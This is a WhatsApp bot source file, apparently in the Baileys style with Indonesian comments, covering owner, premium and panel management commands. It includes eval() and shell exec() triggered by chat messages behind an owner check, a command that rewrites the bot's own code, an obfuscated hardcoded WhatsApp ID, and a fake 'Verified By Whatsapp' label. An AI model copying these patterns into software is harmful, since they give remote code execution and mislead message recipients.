  » Creator : @${global.owner}
  » Uptime Vps : *${runtime(os.uptime())}*
  » Uptime Bot : *${runtime(process.uptime())}*
  » Totalfitur : ${totalfitur()}

  • Your Status *(${isCreator ? "Ownerbot" : isPremium ? "Reseller Panel" : "Free User"})*
  
 *── Ownermenu*
  • .addowner 
  • .addprem 
  • .addcase
  • .listowner
  • .listprem
  • .delowner
  • .delprem
  • .delcase
  • .getcase
  • .getfile
  • .ping
  • .public
  • .self
  • .setppbot
  • .setnamabot
  • .setbiobot
  • .owner 
  • .backup

*── Panelmenu*
  • .addakses
  • .listakses
  • .delakses
  • .listpanel
  • .delpanel
  • .listadmin
  • .deladmin
  • .1gb - unli
  • .cadmin

*── Panelmenu-V2*
  • .listpanel-V2
  • .delpanel-V2
  • .listadmin-V2
  • .deladmin-V2
  • .1gb-V2  -  unli-V2
  • .cadmin-V2

*── Aimenu*
  • .aiedit
  • .aiislam
  • .ainfsw
  • .aigen
  • .gemini
  • .blackbox

*── Downloadmenu*
  • .tt
  • .ig
  • .facebook
  • .gitclone
  • .getgist
  • .mediafire
  • .play
  • .play2

*── Channelmenu*
  • .cekidch
  • .addidch
  • .delidch
  • .listidch
  • .createch
  • .jpmch

*── Othermenu*
  • .totalchat
  • .topcmd
  • .totalfitur
  • .brat
  • .bratvid
  • .cekjarak
  • .cekhost
  • .createkalender
  • .createqr
  • .readerqr
  • .getpp

 © baniwwXD`;
    bani.sendMessage(m.chat, {
  document: fs.readFileSync("./package.json"),
  fileName: `${global.owner}`,
  mimetype: "application/pdf",
  fileLength: 0,
  pageCount: 0,
  caption: teks,
  mentions: [m.sender],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterJid: global.idSaluran,
      newsletterName: global.namaSaluran
    },
    externalAdReply: {
      title: `Powered By ${global.creator}`,
      body: "Verified By Whatsapp ",
      thumbnailUrl: global.imgthumb,
      sourceUrl: global.linkSaluran,
      mediaType: 1,
      renderLargerThumbnail: true
    }
  }
}, {
  quoted: m })
}
break

case 'addcase': {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply('Mana case nya');
    const fs = require('fs');
    const namaFile = 'case.js';
    const caseBaru = `${text}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return m.reply('Gagal membaca file');
        }
        const posisiAwal = data.indexOf("switch (command) {");
        if (posisiAwal !== -1) {
            const posisiInsert = posisiAwal + "switch (command) {".length;
            const kodeBaruLengkap = data.slice(0, posisiInsert) + '\n\n' + caseBaru + '\n' + data.slice(posisiInsert);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    m.reply('Terjadi kesalahan saat menulis file: ' + err);
                } else {
                    m.reply('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            m.reply('Tidak dapat menemukan switch statement dalam file.');
        }
    });
}
break
        
case 'ping': {
    const used = process.memoryUsage();
    const cpus = os.cpus().map(cpu => {
        cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0);
        return cpu;
    });

    const cpu = cpus.reduce((last, cpu, _, { length }) => {
        last.total += cpu.total;
        last.speed += cpu.speed / length;
        last.times.user += cpu.times.user;
        last.times.nice += cpu.times.nice;
        last.times.sys += cpu.times.sys;
        last.times.idle += cpu.times.idle;
        last.times.irq += cpu.times.irq;
        return last;
    }, {
        speed: 0,
        total: 0,
        times: {
            user: 0,
            nice: 0,
            sys: 0,
            idle: 0,
            irq: 0
        }
    });

    let timestamp = speed();
    let latensi = speed() - timestamp;
    let neww = performance.now();
    let oldd = performance.now();

    let respon = `
*㆔ Response Speed:* ${latensi.toFixed(4)} _Second_  
ㆳ ${(oldd - neww).toFixed(2)} _Milliseconds_  
ㆳ *Runtime:* ${runtime(process.uptime())}

┌───────────────── •
│ *Info Server ㇀*  
│ *RAM:* ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
└───────────────── •

ㇴ *NodeJS Memory Usage*  
${Object.keys(used)
    .map((key, _, arr) => `> ${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatp(used[key])}`)
    .join('\n')}

${cpus[0] ? `ㆫ *Total CPU Usage*  
\`${cpus[0].model.trim()} (${cpu.speed} MHz)\`
${Object.keys(cpu.times)
    .map(type => `> *${(type + '*').padEnd(6)} : ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`)
    .join('\n')}

ㇴ *CPU Core(s) Usage (${cpus.length} Core CPU)*  
${cpus
    .map(
        (cpu, i) => `> [ ${i + 1} ] ${cpu.model.trim()} (${cpu.speed} MHz)  
${Object.keys(cpu.times)
    .map(type => `- *${(type + '*').padEnd(6)} : ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`)
    .join('\n')}`
    )
    .join('\n\n')}` : ''}
`;

    m.reply(respon);
}
break;
case 'self': {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam 
    bani.public = false
    m.reply(`*Switch To Mode :* \`Self\``)
}
break

case 'public': {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    bani.public = true
    m.reply(`*Switch To Mode :* \`Public\``)
}
break
case 'owner': {
        try {
        let vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${global.ownername}\nTEL;type=CELL;type=VOICE;waid=${global.owner}:+${global.owner}\nEND:VCARD`;

        let quotedMessage = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Kontak Owner Kami`,jpegThumbnail: ""}}}
            
        

        await bani.sendMessage(m.chat, { contacts: { displayName: global.ownername, contacts: [{ vcard }] } }, { quoted: quotedMessage });
    } catch (error) {
        console.error("Error saat mengirim kontak owner:", error);
    }
}
break
case "addprem": {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
   let prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let ceknya = await bani.onWhatsApp(prrkek) // Mengecek Apkah Nomor ${prrkek} Terdaftar Di WhatsApp 
    if (ceknya.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    premium.push(prrkek)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Added ${prrkek} To Database`)
}
break

case "delprem": {
    if (!isCreator) return
    // Ketika Ada Orang Lain/ Selain Owner Yang Mengetik Command Ini Maka Bot Tidak Akan Merespon Walau Menggunakan Mode Public Dan Ini Akan Mengurangi Spam
    if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${global.owner}`)
    let ya = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`
    let unp = premium.indexOf(ya)
    premium.splice(unp, 1)
    fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
    m.reply(`Successfully Removed ${ya} From Database`)
}
break
case "listprem": {
if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let premList = JSON.parse(fs.readFileSync("./database/premium.json"));
 
 if (premList.length === 0) return m.reply("⚠️ Tidak ada Premium yang terdaftar!");
 let text = "💭 *Daftar Premium:*\n\n";
 premList.forEach((prrem, index) => {
 text += `- ${index + 1}. @${prrem}\n`;
 });
 bani.sendMessage(m.chat, { text, mentions: premList.map(v => v + "@s.whatsapp.net") }, { quoted: m });
}
break;
case "addcreator":
case "addowner": {
 if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let nomor;
 if (m.quoted && m.quoted.sender) {
 // Jika pengguna menandai seseorang
 nomor = m.quoted.sender.split("@")[0];
 } else if (args[0]) {
 // Jika pengguna mengetik nomor langsung
 nomor = args[0].replace(/[^0-9]/g, ""); 
 } else {
 return m.reply(`Penggunaan: ${prefix+command} <nomor atau tag>\nContoh: ${prefix+command} 6285659202292`);
 }
 let ceknya = await bani.onWhatsApp(nomor + "@s.whatsapp.net"); // Mengecek apakah nomor valid
 if (ceknya.length == 0) return m.reply("⚠️ Masukkan nomor yang valid dan terdaftar di WhatsApp!");
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (ownerList.includes(nomor)) return m.reply("✅ Nomor tersebut sudah ada dalam daftar Owner!");
 ownerList.push(nomor);
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 m.reply(`✅ Berhasil menambahkan *${nomor}* sebagai Owner!`);
}
break;
case "delcreator":
case "delowner": {
 if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let nomor;
 if (m.quoted && m.quoted.sender) {
 // Jika pengguna menandai seseorang
 nomor = m.quoted.sender.split("@")[0];
 } else if (args[0]) {
 // Jika pengguna mengetik nomor langsung
 nomor = args[0].replace(/[^0-9]/g, ""); 
 } else {
 return m.reply(`Penggunaan: ${prefix+command} <nomor atau tag>\nContoh: ${prefix+command} 6285659202292`);
 }
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 if (!ownerList.includes(nomor)) return m.reply("⚠️ Nomor tidak ditemukan dalam daftar Owner!");
 ownerList = ownerList.filter(owner => owner !== nomor);
 fs.writeFileSync("./database/owner.json", JSON.stringify(ownerList, null, 2));
 m.reply(`✅ Berhasil menghapus *${nomor}* dari daftar Owner!`);
}
break;
case "listcreator":
case "listowner": {
if (!isCreator) return m.reply("❗ *Access Denied*\nFitur Only `Owner`")
 let ownerList = JSON.parse(fs.readFileSync("./database/owner.json"));
 
 if (ownerList.length === 0) return m.reply("⚠️ Tidak ada Owner yang terdaftar!");
 let text = "💭 *Daftar Owner:*\n\n";
 ownerList.forEach((owner, index) => {
 text += `- ${index + 1}. @${owner}\n`;
 });
 bani.sendMessage(m.chat, { text, mentions: ownerList.map(v => v + "@s.whatsapp.net") }, { quoted: m });
}
break
    
    case 'getcase': {
 if (!isCreator) return m.reply(mess.owner);
 if (!text) return m.reply('Harap masukkan nama case yang ingin dicari!');
 try {
 const caseName = text.replace(/^['"]|['"]$/g, '');
 const getCase = (cases) => {
 const fileContent = fs.readFileSync("./case.js", "utf-8");
 const caseBlock = fileContent.split(`case '${cases}'`)[1];
 if (!caseBlock) throw new Error('Case not found');
 return `case '${cases}'` + caseBlock.split("break")[0] + "break";
 }
 m.reply(`${getCase(caseName)}`);
 } catch (err) {
 m.reply(`Case '${text}' tidak ditemukan! 🚫`);
 }
}
break
    
 case "listcase": {
 const fs = require('fs');
 const namaFile = './case.js';

 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('Terjadi kesalahan saat membaca file:', err);
 return Reply('Gagal membaca file');
 }

 const regex = /case\s+["'](.+?)["']:/g;
 let match;
 let hasil = [];

 while ((match = regex.exec(data)) !== null) {
 hasil.push(match[1]);
 }

 if (hasil.length === 0) {
 return Reply('Tidak ada case yang ditemukan dalam file.');
 }

 const totalCase = hasil.length;

 const rows = hasil.map(v => ({
 title: `📁 ${v}`,
 description: `Klik untuk ambil isi case "${v}"`,
 id: `.getcase ${v}`
 }));

 const sections = [
 {
 title: `📦 Total Case: ${totalCase}`,
 rows: rows
 }
 ];

 return bani.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'listcase_list',
 buttonText: { displayText: 'Lihat Daftar Case' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Lihat Daftar Case',
 sections: sections
 })
 }
 }
 ],
 footer: '© WhatsApp Bots - 2025',
 headerType: 1,
 text: 'Ketuk tombol di bawah untuk melihat semua case.',
 viewOnce: true,
 contextInfo: {
 isForwarded: true,
 mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
 }
 }, { quoted: m });
 });
}
break
//End Case
default:
if ((budy.match) && ["tes","bot"].includes(budy)) {
m.reply(`🤖 *${global.namabot}* is now \`ACTIVE\` ✅`);

}

if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
m.reply(`WaalaikumSalam ${pushname}`)
}

if (budy.startsWith('=>')) {
    if (!isCreator) return

    function Return(sul) {
        sat = JSON.stringify(sul, null, 2)
        bang = util.format(sat)
        if (sat == undefined) {
            bang = util.format(sul)
        }
        return m.reply(bang)
    }
    try {
        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
        m.reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isCreator) return;
    try {
        let evaled = await eval(budy.slice(2));
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
        await m.reply(evaled);
    } catch (err) {
        m.reply(String(err));
    }
}

if (budy.startsWith('$')) {
    if (!isCreator) return
    exec(budy.slice(2), (err, stdout) => {
        if (err) return m.reply(`${err}`)
        if (stdout) return m.reply(stdout)
    })
}

}
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

} catch (err) {
console.log(util.format(err));
let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
bani.sendMessage(global.owner + "@s.whatsapp.net", {text: `
*FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
}}

//================================================================================



let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
